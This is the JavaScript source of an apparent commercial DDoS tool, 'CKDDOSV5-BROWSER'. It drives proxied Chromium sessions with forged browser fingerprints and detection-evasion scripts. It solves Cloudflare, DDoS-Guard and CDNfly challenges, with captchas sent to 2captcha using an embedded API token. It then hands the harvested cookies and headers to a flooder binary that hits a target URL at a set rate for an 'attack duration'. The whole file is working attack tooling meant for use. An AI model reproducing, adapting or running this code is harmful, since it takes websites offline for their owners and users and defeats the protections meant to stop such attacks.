

const { chromium } = require('playwright-extra');
const { FingerprintGenerator } = require('fingerprint-generator');
const { FingerprintInjector } = require('fingerprint-injector');
const { spawn } = require('child_process');
const { UAParser } = require('ua-parser-js');
const argv = require('minimist')(process.argv.slice(2));
const colors = require('colors');
const path = require('path');
const fs = require('fs');
const captcha = require('puppeteer-extra-plugin-recaptcha')


function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
}


/* 
    * Loading custom addons
    * See documentation for more information.
*/

const addons = {
    cloudflare: './ckddosv5/cloudflare.js',
    
};

function checkAddonLoaded() {
    let loadedCount = 0;
    let totalCount = 0;

    for (const addonName in addons) {
        if (addons.hasOwnProperty(addonName)) {
            try {
                const addon = require(addons[addonName]);
                if (typeof addon.initialize === 'function') {
                    global[addonName] = addon;
                    addon.initialize();
                    loadedCount++;
                } else {
                    log(`(${'V5新增绕过3种模式'.red}) Incorrect addon -> ` + `${addonName}`.red);
                }
            } catch (error) {
                log(`(${'V5新增绕过3种模式'.red}) Unable to load addon -> ` + `${addonName}`.red + ` | ` + `${error.message}`.red);
            }
            totalCount++;
        }
    }
    log(`(${'V5新增绕过3种模式'.magenta}) Correctly loaded ${`${loadedCount}`.magenta}/${`${totalCount}`.magenta} addons. `);
}

checkAddonLoaded();


var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.includes('-h') || process.argv.includes('--help')) {
    console.log(`

  Usage: node ${file} [options] <params>

  ${'Options:'.brightWhite}

    ${'*'.cyan} TARGET           Target URL
    ${'*'.cyan} TIME             Attack duration
    ${'*'.cyan} SESSIONS         Number of browser sessions (threads)
    ${'*'.cyan} RATE             Requests per IP
    ${'*'.cyan} PROXY            Proxy file

  ${'Optional:'.brightWhite}

    ${'--system'.cyan}, ${'-s'.cyan}       Choice of operating system '${"linux, windows, random".cyan}'
    ${'--debug'.cyan}, ${'-d'.cyan}        Debug information (Errors) '${"true, false".cyan}'

  ${'Examples:'.brightWhite}

  ${'–'.gray} Standard launch with options without xvfb
    ${('$ node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt').cyan}
  ${'–'.gray} Standard launch with options with xvfb
    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt').cyan} 
  ${'–'.gray} Standard launch with options with optional param
    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt --system=random').cyan} 
    ${'–'.gray} Standard launch with options with several optional params
    ${('$ xvfb-run node ' + file + ' https://shitflare.asia 120 15 64 proxy.txt --system=windows --debug=true').cyan} 

  ${'Authors:'.brightWhite}
  ${'–'.gray} ${'t.me/ckddos'.cyan} - @CKDDOS

`);

    process.exit();
}

if (process.argv.length < 7) {
    console.log(`- @CKDDOSV5-BROWSER \nNo arguments provided. Use node ${file} --help to see usage information`)
    process.exit();
}

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[4];
const rateT = process.argv[5];
const proxyT = process.argv[6];
var systemT = argv["system"] || argv["s"] || 'windows';
var debugT = argv["debug"] || argv["d"] || false;

// Just don't touch it :)
if (typeof debugT === 'string') {
    debugT = debugT === 'true';
}

if (debugT === true) {
    process.on('uncaughtException', function (error) {
        console.log(error)
    });
    process.on('unhandledRejection', function (error) {
        console.log(error)
    })
} else {
    process.on('uncaughtException', function (error) {
        // console.log(error)
    });
    process.on('unhandledRejection', function (error) {
        // console.log(error)
    })
}

const systemsT = ['windows', 'linux']

if (systemT !== 'windows' && systemT !== 'linux' && systemT !== 'random') {
    systemT = 'windows';
}

const proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n')


function randomIntFromInterval(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}



async function flooder(proxy, headerEntries, cookies) {
    const fArgs = [
        '-p', proxy,
        '-u', urlT,
        '-r', rateT,
        '-t', 12000,
        '-d', timeT
    ].concat(...headerEntries.map(entry => ['-h', `${entry[0]}@${entry[1]}`])).concat([
        '-h',
        `cookie@${cookies.length > 0 ? cookies : 'test@1'}`,
        '-h',
        'referer@' + urlT,
    ])

    var starts = spawn('./ckddosv5-kk', fArgs, { stdio: 'inherit', detached: false });
    starts.on('exit', (err, signal) => { starts.kill() });
}



/* 
    * Function called for create new instance of chromium browser with parametres "proxy" that we got from fingerprint.
    * It uses virtual screen for emulating. (Needed xvfb-run <<<params>>>)
*/

async function solver(proxy) {
    log(`(${'CKDDOSV5-BROWSER'.brightBlue}) New browser instance -> ` + `Chromium (${proxy})`.brightBlue)

    var parts = proxy;
    parts = parts.split(':');

    const fingerprintGenerator = new FingerprintGenerator();

    var browserFingerprintWithHeaders;

    if (systemT === 'random') {
        browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
            browsers: [
                { name: 'chrome' }
            ],
            operatingSystems: [
                randomElement(systemsT)
            ]
        });
    } else {
        browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
            browsers: [
                { name: 'chrome' }
            ],
            operatingSystems: [
                systemT
            ]
        });
    }

    fingerprintGenerator.getFingerprint();

    const fingerprintInjector = new FingerprintInjector();
    const { fingerprint } = browserFingerprintWithHeaders;

    const userAgent = fingerprint.navigator.userAgent;
    const locales = fingerprint.navigator.language;

    const browser = await chromium.launch({
        headless: false,
        javaScriptEnabled: true,
        permissions: ['camera', 'microphone'],
        proxy: { server: 'http://' + proxy },
        args: [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--no-sandbox',
            '--enable-experimental-web-platform-features',
            '--disable-dev-shm-usage',
            '--disable-software-rastrizier',
            '--user-agent=' + userAgent,
            '--viewport-size 1920, 1080',
            '--enable-features=NetworkService',
            '--color-scheme=' + randomElement(['dark', 'light'])
        ],
        ignoreDefaultArgs: ['--enable-automation'],
    });

    const context = await browser.newContext({ locale: locales, viewport: { width: 1920, height: 1080 }, deviceScaleFactor: 1 });

    const page = await context.newPage();

    await page.setDefaultNavigationTimeout(0);

    await page.setViewportSize({ width: 1920, height: 1080 });
    await page.emulateMedia({ colorScheme: 'dark' })

    const parser = new UAParser();
    parser.setUA(userAgent);
    const result = parser.getResult();

    await context.addInitScript(args => {
        (function () {
            const ua = args.ua;
            const os = args.os;

            const userAgentData = Object.create(NavigatorUAData.prototype)
            const brands = [{
                "brand": " Not A;Brand",
                "version": "24"
            }, {
                "brand": "Chromium",
                "version": ua.major
            }, {
                "brand": "Google Chrome",
                "version": ua.major
            }]
            Object.defineProperty(userAgentData, 'brands', {
                get: function () {
                    return brands
                }
            })
            Object.defineProperty(userAgentData, 'mobile', {
                get: function () {
                    return false
                }
            })
            Object.defineProperty(userAgentData, 'platform', {
                get: function () {
                    return os.name
                }
            })

            NavigatorUAData.prototype.getHighEntropyValues = function (hints) {
                if (hints.length == 0)
                    return {}

                let hint = {
                    brands,
                    mobile: false,
                    platform: os.name,
                }

                const getters = {
                    architecture: function () {
                        return {
                            architecture: 'x86'
                        }
                    },
                    bitness: function () {
                        return {
                            bitness: '64'
                        }
                    },
                    model: function () {
                        return ''
                    },
                    platformVersion: function () {
                        return {
                            platform: os.name,
                            platformVersion: os.version
                        }
                    },
                    uaFullVersion: function () {
                        return {
                            uaFullVersion: ua.version
                        }
                    },
                    fullVersionList: function () {
                        return {
                            fullVersionList: this.brands
                        }
                    }
                }

                for (let h in hints) {
                    if (getters[hints[h]] != null)
                        Object.assign(hint, getters[hints[h]]())
                }
                return hint
            }
            Object.defineProperty(window.navigator, 'userAgentData', {
                get: function () {
                    return userAgentData
                }
            });
        })()
    }, {
        ua: result.browser,
        os: result.os
    });


    try {
        await page.addInitScript(() => {
            ['height', 'width'].forEach(property => {
                const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
                Object.defineProperty(HTMLImageElement.prototype, property, {
                    ...imageDescriptor,
                    get: function () {
                        if (this.complete && this.naturalHeight == 0) {
                            return 20;
                        }
                        return imageDescriptor.get.apply(this);
                    },
                });
            });

            Object.defineProperty(Notification, 'permission', {
                get: function () {
                    return 'default';
                }
            });

            Object.defineProperty(navigator, 'pdfViewerEnabled', {
                get: () => true,
            });

            Object.defineProperty(navigator.connection, 'rtt', {
                get: () => 150,
            });

            Object.defineProperty(navigator, 'share', {
                get: () => false,
            });

            Object.defineProperty(navigator, 'bluetooth', {
                get: () => true,
            });

        })

        await page.addInitScript(() => {
            Object.defineProperty(navigator, 'keyboard', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaCapabilities', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaDevices', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaSession', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'oscpu', {
                get: function () {
                    return 'Windows (Win32)';
                }
            });
            Object.defineProperty(navigator, 'platform', {
                get: function () {
                    return 'Win32';
                }
            });
            Object.defineProperty(navigator, 'product', {
                get: function () {
                    return 'Gecko';
                }
            });
            Object.defineProperty(navigator, 'productSub', {
                get: function () {
                    return '20100101';
                }
            });
            Object.defineProperty(navigator, 'vendor', {
                get: function () {
                    return 'Google Inc.';
                }
            });
        });
    } catch (err) { }


    await page.route('***', route => {
        route.continue();
    });

    const captchaoptions = {
        visualFeedback: true,
        provider: {
            id: '2captcha',
            token: 'dcd172dae04be6a8f95c5a0ca23443e4',
        },
    }
    chromium.use(captcha(captchaoptions))

    const response = await page.goto(urlT, { locale: locales, deviceScaleFactor: 1 });

    await page.waitForTimeout(11000);

    const status = await response.status();

    try {
        if (![200, 404].includes(status)) {
            const title = await page.title();

            if (title === 'Access denied' || title === 'Attention Required! | Cloudflare') {
                await browser.close();
                await context.close();

                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
                solver(proxyN);
            }


            // Looking for CloudFlare JS
            if (title === 'Just a moment...') {

                const resultCloudFlare = await cloudflare.captchaSolver(page, context, response)

                const receivedTitle = resultCloudFlare[0]           // Page title
                const receivedCookies = resultCloudFlare[1]         // Page cookies
                const receivedHeaderEntries = resultCloudFlare[2]   // Headers for flooder

                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);

                // Starting a new instance of the flooder
                flooder(proxy, receivedHeaderEntries, receivedCookies);

                await browser.close();
                await context.close();

                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
                solver(proxyN);


            } else if (await page.content().includes('/.well-known/ddos-guard/check?context=free_splash')) {
                const resultDDosGuard = await ddosguard.captchaSolver(page, context, response)

                const receivedTitle = resultDDosGuard[0]           // Page title
                const receivedCookies = resultDDosGuard[1]         // Page cookies
                const receivedHeaderEntries = resultDDosGuard[2]   // Headers for flooder

                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);

                // Starting a new instance of the flooder
                flooder(proxy, receivedHeaderEntries, receivedCookies);

                await browser.close();
                await context.close();

                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
                solver(proxyN);


            } else {
                log(`(${'CKDDOSV5-BROWSER'.green}) No Detect protection ` + `(JS/Captcha)`.green);

                await page.waitForTimeout(1000);

                const title = await page.title();
                const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
                const headers = await response.request().allHeaders();
                const headerEntries = Object.entries(headers);

                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
                log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);

                // Starting a new instance of the flooder
                flooder(proxy, headerEntries, cookies);

                await browser.close();
                await context.close();

                const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
                solver(proxyN);
            }



        } else if (await page.locator('//*[@id="slider"]/div[1]')) {
            await page.waitForTimeout(1000);

            const resultCDNfly = await cdnfly.sliderSolver(page, context, response)

            const receivedTitle = resultCDNfly[0]           // Page title
            const receivedCookies = resultCDNfly[1]         // Page cookies
            const receivedHeaderEntries = resultCDNfly[2]   // Headers for flooder

            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);

            // Starting a new instance of the flooder
            flooder(proxy, receivedHeaderEntries, receivedCookies);

            await browser.close();
            await context.close();

            const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
            solver(proxyN);


        } else {
            log(`(${'CKDDOSV5-BROWSER'.green}) No Detect protection ` + `(JS/Captcha)`.green);

            await page.waitForTimeout(1000);

            const title = await page.title();
            const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
            const headers = await response.request().allHeaders();
            const headerEntries = Object.entries(headers);

            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
            log(`(${'CKDDOSV5-BROWSER'.magenta}) Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);

            // Starting a new instance of the flooder
            flooder(proxy, headerEntries, cookies);

            await browser.close();
            await context.close();

            const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
            solver(proxyN);
        }
    } catch (e) {
        //  console.log(e)

        const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
        solver(proxyN);

        await browser.close();
        await context.close();
    }
}


async function sessionIn() {
    for (let i = 0; i < threadsT; i++) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];

        solver(proxy);
    }
}

function main() {
    sessionIn();
}

main();

setTimeout(() => {
    process.exit(-1);
    starts.kill(-1);
}, timeT * 1000)